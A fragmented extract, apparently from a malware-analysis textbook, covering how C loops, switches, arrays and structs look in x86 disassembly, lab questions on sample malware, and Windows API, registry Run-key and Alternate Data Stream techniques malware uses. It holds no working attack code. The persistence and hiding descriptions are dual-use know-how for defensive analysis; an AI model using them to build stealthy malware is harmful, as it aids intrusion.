00401023        cmp     [ebp+var_C], 0
00401027        jnz     short loc_401038 
00401029        push    offset aZIsZeroAndXY_ ; "z is zero and x = y.\n"
0040102E        call    printf
00401033        add     esp, 4
00401036        jmp     short loc_401045
00401038 loc_401038:                             
00401038        push    offset aZIsNonZeroAndX ; "z is non-zero and x = y.\n"
0040103D        call    printf
00401042        add     esp, 4
[Word Count: 78]

sub_401000:
push    ebp
mov     ebp, esp
sub     esp, 8
mov     [ebp+var_8], 1
mov     [ebp+var_4], 2
mov     eax, [ebp+var_8]
cmp     eax, [ebp+var_4]
jnz     short loc_40102B
[Word Count: 24]

push    offset aXEqualsY_; "x equals y.\n"
call    sub_40103E
add     esp, 4
jmp     short loc_401038
[Word Count: 14]

loc_40102B:             
push    offset aXIsNotEqualToY; "x is not equal to y.\n"
call    sub_40103E
add     esp, 4
[Word Count: 15]

loc_401038:
xor     eax, eax
mov     esp, ebp
pop     ebp
retn
[Word Count: 10]

00401045 loc_401045:                            
00401045        jmp     short loc_401069
00401047 loc_401047:                             
00401047        cmp     [ebp+var_C], 0
0040104B        jnz     short loc_40105C 
0040104D        push    offset aZZeroAndXY_ ; "z zero and x != y.\n"
00401052        call    printf
00401057        add     esp, 4
0040105A        jmp     short loc_401069
0040105C loc_40105C:                             
0040105C        push    offset aZNonZeroAndXY_ ; "z non-zero and x != y.\n"
00401061        call    printf00401061
[Word Count: 55]

Listing 6-11: Assembly code for the nested if statement example shown in Listing 6-10
[Word Count: 14]

As you can see, three different conditional jumps occur. The first occurs 
if var_4 does not equal var_8 at . The other two occur if var_C is not equal to 
zero at  and .
[Word Count: 35]

Loops and repetitive tasks are very common in all software, and it is impor-
tant that you are able to recognize them.
[Word Count: 22]

The for loop is a basic looping mechanism used in C programming. for loops 
always have four components: initialization, comparison, execution instruc-
tions, and the increment or decrement.
Listing 6-12 shows an example of a for loop.
[Word Count: 37]

for(i=0; i<100; i++)
{
   printf("i equals %d\n", i);
}
[Word Count: 9]

Recognizing C Code Constructs in Assembly
117
[Word Count: 7]

taken, the printf instruction will execute, and an unconditional jump occurs 
at , which causes the increment to occur.
[Word Count: 19]

00401004        mov     [ebp+var_4], 0 
0040100B        jmp     short loc_401016 
0040100D loc_40100D:
0040100D        mov     eax, [ebp+var_4] 
00401010        add     eax, 1
00401013        mov     [ebp+var_4], eax 
00401016 loc_401016:
00401016        cmp     [ebp+var_4], 64h 
0040101A        jge     short loc_40102F 
0040101C        mov     ecx, [ebp+var_4]
0040101F        push    ecx
00401020        push    offset aID  ; "i equals %d\n"
00401025        call    printf
0040102A        add     esp, 8
0040102D        jmp     short loc_40100D 
[Word Count: 65]

Listing 6-13: Assembly code for the for loop example in Listing 6-12
[Word Count: 12]

A for loop can be recognized using IDA Pro’s graphing mode, as shown 
in Figure 6-2.
[Word Count: 16]

Figure 6-2: Disassembly graph for the for loop example in Listing 6-13
[Word Count: 12]

sub_401000:
push    ebp
mov     ebp, esp
push    ecx
mov     [ebp+var_4], 0
jmp     short loc_401016
[Word Count: 14]

loc_401016:
cmp     [ebp+var_4], 64h
jge     short loc_40102F
[Word Count: 7]

mov     ecx, [ebp+var_4]
push    ecx
push    offset aIEqualsD; "i equals %d\n"
call    sub_401035
add     esp, 8
jmp     short loc_40100D
[Word Count: 19]

loc_40100D:
mov     eax, [ebp+var_4]
add     eax, 1
mov     [ebp+var_4], eax
[Word Count: 10]

loc_40102F:
xor     eax, eax
mov     esp, ebp
pop     ebp
retn
[Word Count: 10]

In the figure, the upward pointing arrow after the increment code indi-
cates a loop. These arrows make loops easier to recognize in the graph view 
than in the standard disassembly view. The graph displays five boxes: The top 
four are the components of the for loop (initialization, comparison, execu-
tion, and increment, in that order). The box on the bottom right is the func-
tion epilogue, which we described in Chapter 4 as the portion of a function 
responsible for cleaning up the stack and returning.
[Word Count: 87]

The while loop is frequently used by malware authors to loop until a condi-
tion is met, such as receiving a packet or command. while loops look similar 
to for loops in assembly, but they are easier to understand. The while loop in 
Listing 6-14 will continue to loop until the status returned from checkResult 
is 0.
[Word Count: 57]

while(status == 0){
     result = performAction();
     status = checkResult(result);
}
[Word Count: 10]

The assembly code in Listing 6-15 looks similar to the for loop, except 
that it lacks an increment section. A conditional jump occurs at  and an 
unconditional jump at , but the only way for this code to stop executing 
repeatedly is for that conditional jump to occur.
[Word Count: 49]

00401036        mov     [ebp+var_4], 0
0040103D        mov     [ebp+var_8], 0
00401044 loc_401044:
00401044        cmp     [ebp+var_4], 0
00401048        jnz     short loc_401063 
0040104A        call    performAction
0040104F        mov     [ebp+var_8], eax
00401052        mov     eax, [ebp+var_8]
00401055        push    eax
00401056        call    checkResult
0040105B        add     esp, 4
0040105E        mov     [ebp+var_4], eax
00401061        jmp     short loc_401044 
[Word Count: 49]

Listing 6-15: Assembly code for the while loop example in Listing 6-14
[Word Count: 12]

Recognizing C Code Constructs in Assembly
119
[Word Count: 7]

int test(int x, int y, int z);
int a, b, c, ret;
[Word Count: 12]

Listing 6-16: Pseudocode for a function call
[Word Count: 7]

The three most common calling conventions you will encounter are 
cdecl, stdcall, and fastcall. We discuss the key differences between them in 
the following sections.
[Word Count: 25]

NOTE
Although the same conventions can be implemented differently between compilers, we’ll 
focus on the most common ways they are used.
[Word Count: 21]

cdecl is one of the most popular conventions and was described in Chapter 4 
when we introduced the stack and function calls. In cdecl, parameters are 
pushed onto the stack from right to left, the caller cleans up the stack when 
the function is complete, and the return value is stored in EAX. Listing 6-17 
shows an example of what the disassembly would look like if the code in List-
ing 6-16 were compiled to use cdecl.
[Word Count: 77]

push c
push b
push a
call test
add esp, 12
mov ret, eax
[Word Count: 14]

Notice in the highlighted portion that the stack is cleaned up by the 
caller. In this example, the parameters are pushed onto the stack from right 
to left, beginning with c.
[Word Count: 31]

fastcall
The fastcall calling convention varies the most across compilers, but it gener-
ally works similarly in all cases. In fastcall, the first few arguments (typically 
two) are passed in registers, with the most commonly used registers being 
EDX and ECX (the Microsoft fastcall convention). Additional arguments 
are loaded from right to left, and the calling function is usually responsible 
for cleaning up the stack, if necessary. It is often more efficient to use fastcall 
than other conventions, because the code doesn’t need to involve the stack 
as much.
[Word Count: 89]

In addition to using the different calling conventions described so far, com-
pilers may also choose to use different instructions to perform the same 
operation, usually when the compiler decides to move rather than push 
things onto the stack. Listing 6-18 shows a C code example of a function 
call. The function adder adds two arguments and returns the result. The 
main function calls adder and prints the result using printf.
[Word Count: 71]

int adder(int a, int b)
{
   return a+b;
}
[Word Count: 9]

void main()
{
   int x = 1; 
   int y = 2;
     
   printf("the function returned the number %d\n", adder(x,y));
}
[Word Count: 19]

Listing 6-18: C code for a function call
[Word Count: 8]

Recognizing C Code Constructs in Assembly
121
[Word Count: 7]

The assembly code for the adder function is consistent across compil-
ers and is displayed in Listing 6-19. As you can see, this code adds arg_0 to 
arg_4 and stores the result in EAX. (As discussed in Chapter 4, EAX stores the 
return value.)
[Word Count: 44]

00401730        push    ebp
00401731        mov     ebp, esp
00401733        mov     eax, [ebp+arg_0]
00401736        add     eax, [ebp+arg_4]
00401739        pop     ebp
0040173A        retn
[Word Count: 20]

Listing 6-19: Assembly code for the adder function in Listing 6-18
[Word Count: 11]

NOTE
Remember that even when the same compiler is used, there can be differences in calling 
conventions depending on the various settings and options.
[Word Count: 24]

switch statements are used by programmers (and malware authors) to make a 
decision based on a character or integer. For example, backdoors commonly 
select from a series of actions using a single byte value. switch statements are 
compiled in two common ways: using the if style or using jump tables.
[Word Count: 50]

Table 6-1: Assembly Code for a Function Call with Two Different Calling Conventions
[Word Count: 13]

00401746   mov     [ebp+var_4], 1
0040174D   mov     [ebp+var_8], 2
00401754   mov     eax, [ebp+var_8]
00401757   push    eax
00401758   mov     ecx, [ebp+var_4]
0040175B   push    ecx
0040175C   call    adder
00401761   add     esp, 8
00401764   push    eax
00401765   push    offset TheFunctionRet
0040176A   call    ds:printf
[Word Count: 39]

00401085    mov     [ebp+var_4], 1
0040108C    mov     [ebp+var_8], 2
00401093    mov     eax, [ebp+var_8]
00401096    mov     [esp+4], eax
0040109A    mov     eax, [ebp+var_4]
0040109D    mov     [esp], eax
004010A0    call    adder
[Word Count: 27]

004010A5    mov     [esp+4], eax
004010A9    mov 
[esp], offset TheFunctionRet
004010B0    call    printf
[Word Count: 12]

Listing 6-20 shows a simple switch statement that uses the variable i. Depending 
on the value of i, the code under the corresponding case value will be executed.
[Word Count: 28]

switch(i)
{
   case 1:
      printf("i = %d", i+1);
      break;
   case 2:
      printf("i = %d", i+2);
      break;
   case 3:
      printf("i = %d", i+3);
      break;
   default:
      break;
}
[Word Count: 26]

Listing 6-20: C code for a three-option switch statement
[Word Count: 9]

This switch statement has been compiled into the assembly code shown 
in Listing 6-21. It contains a series of conditional jumps between  and . 
The conditional jump determination is made by the comparison that occurs 
directly before each jump.
The switch statement has three options, shown at , , and . These 
code sections are independent of each other because of the unconditional 
jumps to the end of the listing. (You’ll probably find that switch statements 
are easier to understand using the graph shown in Figure 6-3.)
[Word Count: 88]

00401013        cmp     [ebp+var_8], 1
00401017        jz      short loc_401027 
00401019        cmp     [ebp+var_8], 2
0040101D        jz      short loc_40103D
0040101F        cmp     [ebp+var_8], 3
00401023        jz      short loc_401053
00401025        jmp     short loc_401067 
00401027 loc_401027:
00401027        mov     ecx, [ebp+var_4] 
0040102A        add     ecx, 1
0040102D        push    ecx
0040102E        push    offset unk_40C000 ; i = %d
00401033        call    printf
00401038        add     esp, 8
0040103B        jmp     short loc_401067
0040103D loc_40103D:
0040103D        mov     edx, [ebp+var_4] 
00401040        add     edx, 2
00401043        push    edx
00401044        push    offset unk_40C004 ; i = %d
00401049        call    printf
0040104E        add     esp, 8
00401051        jmp     short loc_401067
[Word Count: 96]

Recognizing C Code Constructs in Assembly
123
[Word Count: 7]

00401053 loc_401053:
00401053        mov     eax, [ebp+var_4] 
00401056        add     eax, 3
00401059        push    eax
0040105A        push    offset unk_40C008 ; i = %d
0040105F        call    printf
00401064        add     esp, 8
[Word Count: 29]

Listing 6-21: Assembly code for the switch statement example in Listing 6-20
[Word Count: 12]

The next disassembly example is commonly found with large, contiguous 
switch statements. The compiler optimizes the code to avoid needing to make 
so many comparisons. For example, if in Listing 6-20 the value of i were 3, 
three different comparisons would take place before the third case was exe-
cuted. In Listing 6-22, we add one case to Listing 6-20 (as you can see by com-
paring the listings), but the assembly code generated is drastically different.
[Word Count: 77]

switch(i)
{
   case 1:
      printf("i = %d", i+1);
      break;
   case 2:
      printf("i = %d", i+2);
      break;
   case 3:
      printf("i = %d", i+3);
      break;
   case 4:
      printf("i = %d", i+3);
      break;
   default:
      break;
}
[Word Count: 33]

Listing 6-22: C code for a four-option switch statement
[Word Count: 9]

Figure 6-3: Disassembly graph of the if style switch statement example in Listing 6-21
[Word Count: 14]

sub_401000:
push    ebp
mov     ebp, esp
sub     esp, 8
mov     [ebp+var_4], 3
mov     eax, [ebp+var_4]
mov     [ebp+var_8], eax
cmp     [ebp+var_8], 1
jz      short loc_401027
[Word Count: 24]

00401019:
cmp     [ebp+var_8], 2
jz      short loc_40103D
[Word Count: 7]

0040101F:
cmp     [ebp+var_8], 3
jz      short loc_401053
[Word Count: 7]

loc_401067:
xor     eax, eax
mov     esp, ebp
pop     ebp
retn
[Word Count: 10]

loc_401027:
mov     ecx, [ebp+var_4]
add     ecx, 1
push    ecx
push    offset aID    ; "i = %d"
call    sub_40106D
add     esp, 8
jmp     short loc_401067
[Word Count: 24]

loc_40103D:
mov     edx, [ebp+var_4]
add     edx, 2
push    edx
push    offset aID_0    ; "i = %d"
call    sub_40106D
add     esp, 8
jmp     short loc_401067
[Word Count: 24]

loc_401053:
mov     eax, [ebp+var_4]
add     eax, 3
push    eax
push    offset aID_1    ; "i = %d"
call    sub_40106D
add     esp, 8
[Word Count: 21]

Recognizing C Code Constructs in Assembly
125
[Word Count: 7]

00401016        sub     ecx, 1
00401019        mov     [ebp+var_8], ecx
0040101C        cmp     [ebp+var_8], 3
00401020        ja      short loc_401082
00401022        mov     edx, [ebp+var_8]
00401025        jmp     ds:off_401088[edx*4] 
0040102C 
loc_40102C:
              ...
00401040        jmp     short loc_401082
00401042 
loc_401042:
              ...
00401056        jmp     short loc_401082
00401058 
loc_401058:
              ...
0040106C        jmp     short loc_401082
0040106E 
loc_40106E:
              ...
00401082 
loc_401082:          
00401082        xor     eax, eax
00401084        mov     esp, ebp
00401086        pop     ebp
00401087        retn
00401087 
_main   endp
00401088 off_401088  dd offset loc_40102C
0040108C               dd offset loc_401042
00401090               dd offset loc_401058
00401094               dd offset loc_40106E
[Word Count: 83]

Listing 6-23: Assembly code for the switch statement example in Listing 6-22
[Word Count: 12]

The graph in Figure 6-4 for this type of switch statement is clearer than 
the standard disassembly view.
[Word Count: 18]

Figure 6-4: Disassembly graph of jump table switch statement example
[Word Count: 10]

As you can see, each of the four cases is broken down clearly into sepa-
rate assembly code chunks. These chunks appear one after another in a col-
umn after the jump table determines which one to use. Notice that all of 
these boxes and the initial box terminate at the right box, which is the end 
of the function.
[Word Count: 60]

sub_401000:
push    ebp
mov     ebp, esp
sub     esp, 8
mov     [ebp+var_4], 3
mov     eax, [ebp+var_4]
mov     [ebp+var_8], eax
mov     ecx, [ebp+var_8]
sub     ecx, 1
mov     [ebp+var_8], ecx
cmp     [ebp+var_8], 3
ja      short loc_401082
[Word Count: 33]

mov     edx, [ebp+var_8]
jmp     ds:off_401088[edx*4]
[Word Count: 5]

loc_40106E:
mov    eax, [ebp+var_4]
add    eax, 3
push   eax
push   offset aID_2   ; "i = %d"
call   sub_401098
add    esp, 8
[Word Count: 21]

loc_401042:
mov    ecx, [ebp+var_4]
add    ecx, 2
push   ecx
push   offset aID_0   ; "i = %d"
call   sub_401098
add    esp, 8
jmp    short loc_401082
[Word Count: 24]

loc_401058:
mov    edx, [ebp+var_4]
add    edx, 3
push   edx
push   offset aID_1   ; "i = %d"
call   sub_401098
add    esp, 8
jmp    short loc_401082
[Word Count: 24]

loc_40102C:
mov    eax, [ebp+var_4]
add    eax, 1
push   eax
push   offset aID   ; "i = %d"
call   sub_401098
add    esp, 8
jmp    short loc_401082
[Word Count: 24]

loc_401082:
xor     eax, eax
mov     esp, ebp
pop     ebp
retn
[Word Count: 10]

Recognizing C Code Constructs in Assembly
127
[Word Count: 7]

Arrays are used by programmers to define an ordered set of similar data 
items. Malware sometimes uses an array of pointers to strings that contain 
multiple hostnames that are used as options for connections.
Listing 6-24 shows two arrays used by one program, both of which are 
set during the iteration through the for loop. Array a is locally defined, and 
array b is globally defined. These definitions will impact the assembly code.
[Word Count: 73]

int b[5] = {123,87,487,7,978};
void main()
{
   int i;
   int a[5];
[Word Count: 11]

for(i = 0; i<5; i++)
   { 
      a[i] = i;
      b[i] = i;
   }
}
[Word Count: 14]

In assembly, arrays are accessed using a base address as a starting point. 
The size of each element is not always obvious, but it can be determined by 
seeing how the array is being indexed. Listing 6-25 shows the assembly code 
for Listing 6-24.
[Word Count: 44]

00401006        mov     [ebp+var_18], 0
0040100D        jmp     short loc_401018
0040100F loc_40100F:
0040100F        mov     eax, [ebp+var_18]
00401012        add     eax, 1
00401015        mov     [ebp+var_18], eax
00401018 loc_401018:
00401018        cmp     [ebp+var_18], 5
0040101C        jge     short loc_401037
0040101E        mov     ecx, [ebp+var_18]
00401021        mov     edx, [ebp+var_18]
00401024        mov     [ebp+ecx*4+var_14], edx 
00401028        mov     eax, [ebp+var_18]
0040102B        mov     ecx, [ebp+var_18]
0040102E        mov     dword_40A000[ecx*4], eax 
00401035        jmp     short loc_40100F
[Word Count: 62]

Listing 6-25: Assembly code for the array in Listing 6-24
[Word Count: 10]

In this listing, the base address of array b corresponds to dword_40A000, 
and the base address of array a corresponds to var_14. Since these are both 
arrays of integers, each element is of size 4, although the instructions at  
and  differ for accessing the two arrays. In both cases, ecx is used as the 
index, which is multiplied by 4 to account for the size of the elements. The 
resulting value is added to the base address of the array to access the proper 
array element.
[Word Count: 88]

struct my_structure { 
     int x[5];
     char y;
     double z;
};
[Word Count: 11]

void test(struct my_structure *q)
{
     int i;
     q->y = 'a';
     q->z = 15.6;
     for(i = 0; i<5; i++){ 
           q->x[i] = i;
     }
}
[Word Count: 23]

void main()
{
     gms = (struct my_structure *) malloc(
     sizeof(struct my_structure));
     test(gms);
}
[Word Count: 13]

Listing 6-26: C code for a struct example
[Word Count: 8]

Recognizing C Code Constructs in Assembly
129
[Word Count: 7]

00401050        push    ebp 
00401051        mov     ebp, esp 
00401053        push    20h             
00401055        call    malloc 
0040105A        add     esp, 4
0040105D        mov     dword_40EA30, eax 
00401062        mov     eax, dword_40EA30
00401067        push    eax 
00401068        call    sub_401000
0040106D        add     esp, 4
00401070        xor     eax, eax 
00401072        pop     ebp 
00401073        retn
[Word Count: 45]

Listing 6-27: Assembly code for the main function in the struct example in Listing 6-26
[Word Count: 15]

Listing 6-28 shows the disassembly of the test method shown in List-
ing 6-26. arg_0 is the base address of the structure. Offset 0x14 stores the 
character within the struct, and 0x61 corresponds to the letter a in ASCII.
[Word Count: 39]

00401000        push    ebp
00401001        mov     ebp, esp
00401003        push    ecx
00401004        mov     eax,[ebp+arg_0]
00401007        mov     byte ptr [eax+14h], 61h
0040100B        mov     ecx, [ebp+arg_0]
0040100E        fld     ds:dbl_40B120 
00401014        fstp    qword ptr [ecx+18h]
00401017        mov     [ebp+var_4], 0
0040101E        jmp     short loc_401029
00401020 loc_401020:                             
00401020        mov     edx,[ebp+var_4]
00401023        add     edx, 1
00401026        mov     [ebp+var_4], edx
00401029 loc_401029:                             
00401029        cmp     [ebp+var_4], 5
0040102D        jge     short loc_40103D
0040102F        mov     eax,[ebp+var_4]
00401032        mov     ecx,[ebp+arg_0]
[Word Count: 69]

00401035        mov     edx,[ebp+var_4]
00401038        mov     [ecx+eax*4],edx 
0040103B        jmp     short loc_401020
0040103D loc_40103D:                           
0040103D        mov     esp, ebp
0040103F        pop     ebp
00401040        retn
[Word Count: 22]

Listing 6-28: Assembly code for the test function in the struct example in Listing 6-26
[Word Count: 15]

struct node
{
   int x;
   struct node * next;
};
[Word Count: 10]

void main() 
{
   pnode * curr, * head;
   int i;
[Word Count: 10]

Recognizing C Code Constructs in Assembly
131
[Word Count: 7]

for(i=1;i<=10;i++) 
   {
      curr = (pnode *)malloc(sizeof(pnode));
      curr->x = i;
      curr->next  = head;
      head = curr;
   }
[Word Count: 17]

while(curr) 
   {
      printf("%d\n", curr->x);
      curr = curr->next ;
   }
}
[Word Count: 11]

Listing 6-29: C code for a linked list traversal
[Word Count: 9]

0040106A        mov     [ebp+var_8], 0
00401071        mov     [ebp+var_C], 1
00401078
00401078 loc_401078:
00401078        cmp     [ebp+var_C], 0Ah
0040107C        jg      short loc_4010AB
0040107E        mov     [esp+18h+var_18], 8
00401085        call    malloc
0040108A        mov     [ebp+var_4], eax
0040108D        mov     edx, [ebp+var_4]
00401090        mov     eax, [ebp+var_C]
00401093        mov     [edx], eax 
00401095        mov     edx, [ebp+var_4]
00401098        mov     eax, [ebp+var_8]
0040109B        mov     [edx+4], eax 
0040109E        mov     eax, [ebp+var_4]
004010A1        mov     [ebp+var_8], eax
004010A4        lea     eax, [ebp+var_C]
004010A7        inc     dword ptr [eax]
004010A9        jmp     short loc_401078
004010AB loc_4010AB:
004010AB        mov     eax, [ebp+var_8]
[Word Count: 83]

004010AE        mov     [ebp+var_4], eax
004010B1
004010B1 loc_4010B1:
004010B1        cmp     [ebp+var_4], 0 
004010B5        jz      short locret_4010D7
004010B7        mov     eax, [ebp+var_4]
004010BA        mov     eax, [eax]
004010BC        mov     [esp+18h+var_14], eax
004010C0        mov     [esp+18h+var_18], offset aD ; "%d\n"
004010C7        call    printf
004010CC        mov     eax, [ebp+var_4]
004010CF        mov     eax, [eax+4]
004010D2        mov     [ebp+var_4], eax 
004010D5        jmp     short loc_4010B1 
[Word Count: 56]

Listing 6-30: Assembly code for the linked list traversal example in Listing 6-29
[Word Count: 13]

Recognizing C Code Constructs in Assembly
133
[Word Count: 7]

The goal of the labs for this chapter is to help you to understand the overall 
functionality of a program by analyzing code constructs. Each lab will guide 
you through discovering and analyzing a new code construct. Each lab builds 
on the previous one, thus creating a single, complicated piece of malware 
with four constructs. Once you’ve finished working through the labs, you 
should be able to more easily recognize these individual constructs when you 
encounter them in malware.
[Word Count: 79]

In this lab, you will analyze the malware found in the file Lab06-01.exe.
[Word Count: 13]

1.
What is the major code construct found in the only subroutine called 
by main?
[Word Count: 15]

2.
What is the subroutine located at 0x40105F?
[Word Count: 8]

Analyze the malware found in the file Lab06-02.exe.
[Word Count: 8]

1.
What operation does the first subroutine called by main perform?
[Word Count: 11]

2.
What is the subroutine located at 0x40117F?
[Word Count: 8]

3.
What does the second subroutine called by main do?
[Word Count: 10]

4.
What type of code construct is used in this subroutine?
[Word Count: 11]

5.
Are there any network-based indicators for this program?
[Word Count: 9]

In this lab, we’ll analyze the malware found in the file Lab06-03.exe.
[Word Count: 12]

1.
Compare the calls in main to Lab 6-2’s main method. What is the new 
function called from main?
[Word Count: 19]

2.
What parameters does this new function take?
[Word Count: 8]

3.
What major code construct does this function contain?
[Word Count: 9]

5.
Are there any host-based indicators for this malware?
[Word Count: 9]

In this lab, we’ll analyze the malware found in the file Lab06-04.exe.
[Word Count: 12]

1.
What is the difference between the calls made from the main method in 
Labs 6-3 and 6-4?
[Word Count: 18]

2.
What new code construct has been added to main?
[Word Count: 10]

3.
What is the difference between this lab’s parse HTML function and 
those of the previous labs?
[Word Count: 17]

4.
How long will this program run? (Assume that it is connected to the 
Internet.)
[Word Count: 15]

5.
Are there any new network-based indicators for this malware?
[Word Count: 10]

A N A L Y Z I N G  M A L I C I O U S  
W I N D O W S  P R O G R A M S
[Word Count: 33]

Most malware targets Windows platforms and interacts 
closely with the OS. A solid understanding of basic 
Windows coding concepts will allow you to identify 
host-based indicators of malware, follow malware as 
it uses the OS to execute code without a jump or call 
instruction, and determine the malware’s purpose.
[Word Count: 49]

and how you can create host-based indicators. Next, we cover the different 
ways that a program can execute code located outside the file you’re ana-
lyzing. We finish with a discussion of how malware uses kernel mode for 
additional functionality and stealth.
[Word Count: 42]

The Windows API is a broad set of functionality that governs the way that 
malware interacts with the Microsoft libraries. The Windows API is so exten-
sive that developers of Windows-only applications have little need for third-
party libraries.
The Windows API uses certain terms, names, and conventions that you 
should become familiar with before turning to specific functions.
[Word Count: 59]

DWORD (dw)
A double-WORD, 32-bit unsigned value.
[Word Count: 7]

Handles (H)
A reference to an object. The information stored in the handle is not docu-
mented, and the handle should be manipulated only by the Windows API. 
Examples include HModule, HInstance, and HKey.
[Word Count: 34]

Long Pointer (LP)
A pointer to another type. For example, LPByte is a pointer to a byte, and 
LPCSTR is a pointer to a character string. Strings are usually prefixed by LP 
because they are actually pointers. Occasionally, you will see Pointer 
(P)... prefixing another type instead of LP; in 32-bit systems, this is the 
same as LP. The difference was meaningful in 16-bit systems.
[Word Count: 65]

Callback
Represents a function that will be called by the Windows API. For example, 
the InternetSetStatusCallback function passes a pointer to a function that 
is called whenever the system has an update of the Internet status.
[Word Count: 36]

Analyzing Malicious Windows Programs
137
[Word Count: 5]

NOTE
According to Microsoft you can’t use the HWND as a pointer or arithmetic value. How-
ever, some functions return handles that represent values that can be used as pointers. 
We’ll point those out as we cover them in this chapter.
[Word Count: 41]

One of the most common ways that malware interacts with the system is by 
creating or modifying files, and distinct filenames or changes to existing file-
names can make good host-based indicators.
File activity can hint at what the malware does. For example, if the mal-
ware creates a file and stores web-browsing habits in that file, the program is 
probably some form of spyware.
Microsoft provides several functions for accessing the file system, as 
follows:
[Word Count: 76]

CreateFile
This function is used to create and open files. It can open existing files, 
pipes, streams, and I/O devices, and create new files. The parameter 
dwCreationDisposition controls whether the CreateFile function creates a 
new file or opens an existing one.
[Word Count: 41]

ReadFile and WriteFile
These functions are used for reading and writing to files. Both operate 
on files as a stream. When you first call ReadFile, you read the next several 
bytes from a file; the next time you call it, you read the next several bytes 
after that. For example, if you open a file and call ReadFile with a size 
of 40, the next time you call it, it will read beginning with the forty-first 
byte. As you can imagine, though, neither function makes it particularly 
easy to jump around within a file.
[Word Count: 94]

CreateFileMapping and MapViewOfFile
File mappings are commonly used by malware writers because they 
allow a file to be loaded into memory and manipulated easily. The 
CreateFileMapping function loads a file from disk into memory. The 
MapViewOfFile function returns a pointer to the base address of the 
mapping, which can be used to access the file in memory. The program 
calling these functions can use the pointer returned from MapViewOfFile
[Word Count: 69]

to read and write anywhere in the file. This feature is extremely handy 
when parsing a file format, because you can easily jump to different 
memory addresses.
[Word Count: 27]

NOTE
File mappings are commonly used to replicate the functionality of the Windows loader. 
After obtaining a map of the file, the malware can parse the PE header and make all 
necessary changes to the file in memory, thereby causing the PE file to be executed as if it 
had been loaded by the OS loader.
[Word Count: 56]

Shared files are special files with names that start with \\serverName\share or 
\\?\serverName\share. They access directories or files in a shared folder stored 
on a network. The \\?\ prefix tells the OS to disable all string parsing, and it 
allows access to longer filenames.
[Word Count: 44]

Additional files are accessible via namespaces within the OS. Namespaces 
can be thought of as a fixed number of folders, each storing different types 
of objects. The lowest level namespace is the NT namespace with the prefix \. 
The NT namespace has access to all devices, and all other namespaces exist 
within the NT namespace.
[Word Count: 55]

NOTE
To browse the NT namespace on your system, use the WinObj Object Manager name-
space viewer available free from Microsoft.
[Word Count: 21]

Analyzing Malicious Windows Programs
139
[Word Count: 5]

drive at regular intervals, eventually corrupting the victim’s OS and render-
ing it unable to boot. The worm didn’t last very long, because the victim’s sys-
tem often failed before the worm could spread, but it caused a lot of damage 
to the systems it did infect.
Another example is malware usage of \Device\PhysicalMemory in order to 
access physical memory directly, which allows user-space programs to write to 
kernel space. This technique has been used by malware to modify the kernel 
and hide programs in user space.
[Word Count: 87]

NOTE
Beginning with Windows 2003 SP1, \Device\PhysicalMemory is inaccessible from 
user space. However, you can still get to \Device\PhysicalMemory from kernel space, 
which can be used to access low-level information such as BIOS code and configuration.
[Word Count: 36]

The Alternate Data Streams (ADS) feature allows additional data to be added to 
an existing file within NTFS, essentially adding one file to another. The extra 
data does not show up in a directory listing, and it is not shown when display-
ing the contents of the file; it’s visible only when you access the stream.
ADS data is named according to the convention normalFile.txt:Stream:$DATA, 
which allows a program to read and write to a stream. Malware authors like 
ADS because it can be used to hide data.
[Word Count: 88]

Root key
The registry is divided into five top-level sections called root 
keys. Sometimes, the terms HKEY and hive are also used. Each of the 
root keys has a particular purpose, as explained next.
[Word Count: 34]

Subkey
A subkey is like a subfolder within a folder.
[Word Count: 10]

Key
A key is a folder in the registry that can contain additional folders 
or values. The root keys and subkeys are both keys.
[Word Count: 24]

Value entry
A value entry is an ordered pair with a name and value.
[Word Count: 14]

Value or data
The value or data is the data stored in a registry entry.
[Word Count: 15]

The registry is split into the following five root keys:
[Word Count: 10]

HKEY_LOCAL_MACHINE (HKLM)
Stores settings that are global to the local 
machine
[Word Count: 11]

HKEY_CURRENT_USER (HKCU)
Stores settings specific to the current user
[Word Count: 9]

HKEY_CLASSES_ROOT
Stores information defining types
[Word Count: 5]

HKEY_CURRENT_CONFIG
Stores settings about the current hardware configu-
ration, specifically differences between the current and the standard 
configuration
[Word Count: 18]

HKEY_USERS
Defines settings for the default user, new users, and current 
users
[Word Count: 12]

The two most commonly used root keys are HKLM and HKCU. (These keys 
are commonly referred to by their abbreviations.)
Some keys are actually virtual keys that provide a way to reference the 
underlying registry information. For example, the key HKEY_CURRENT_USER is 
actually stored in HKEY_USERS\SID, where SID is the security identifier of the 
user currently logged in. For example, one popular subkey, HKEY_LOCAL_MACHINE\
SOFTWARE\Microsoft\Windows\CurrentVersion\Run, contains a series of values that 
are executables that are started automatically when a user logs in. The root 
key is HKEY_LOCAL_MACHINE, which stores the subkeys of SOFTWARE, Microsoft, 
Windows, CurrentVersion, and Run.
[Word Count: 98]

The Registry Editor (Regedit), shown in Figure 7-1, is a built-in Windows tool 
used to view and edit the registry. The window on the left shows the open 
subkeys. The window on the right shows the value entries in the subkey. Each 
value entry has a name, type, and value. The full path for the subkey currently 
being viewed is shown at the bottom of the window.
[Word Count: 67]

Writing entries to the Run subkey (highlighted in Figure 7-1) is a well-known 
way to set up software to run automatically. While not a very stealthy tech-
nique, it is often used by malware to launch itself automatically.
The Autoruns tool (free from Microsoft) lists code that will run auto-
matically when the OS starts. It lists executables that run, DLLs loaded into 
Internet Explorer and other programs, and drivers loaded into the kernel. 
Autoruns checks about 25 to 30 locations in the registry for code designed 
to run automatically, but it won’t necessarily list all of them.
[Word Count: 98]

Analyzing Malicious Windows Programs
141
[Word Count: 5]

Malware often uses registry functions that are part of the Windows API in 
order to modify the registry to run automatically when the system boots. The 
following are the most common registry functions:
[Word Count: 33]

RegOpenKeyEx
Opens a registry for editing and querying. There are func-
tions that allow you to query and edit a registry key without opening it 
first, but most programs use RegOpenKeyEx anyway.
[Word Count: 32]

RegSetValueEx
Adds a new value to the registry and sets its data.
[Word Count: 12]

RegGetValue
Returns the data for a value entry in the registry.
[Word Count: 11]

When you see these functions in malware, you should identify the regis-
try key they are accessing.
In addition to registry keys for running on startup, many registry values 
are important to the system’s security and settings. There are too many to list 
here (or anywhere), and you may need to resort to a Google search for regis-
try keys as you see them accessed by malware.
[Word Count: 67]

Listing 7-1 shows real malware code opening the Run key from the registry 
and adding a value so that the program runs each time Windows starts. The 
RegSetValueEx function, which takes six parameters, edits a registry value entry 
or creates a new one if it does not exist.
[Word Count: 48]

NOTE
When looking for function documentation for RegOpenKeyEx, RegSetValuEx, and so on, 
remember to drop the trailing W or A character.
[Word Count: 21]

Listing 7-1: Code that modifies registry settings
[Word Count: 7]

Files with a .reg extension contain human-readable registry data. When a 
user double-clicks a .reg file, it automatically modifies the registry by merg-
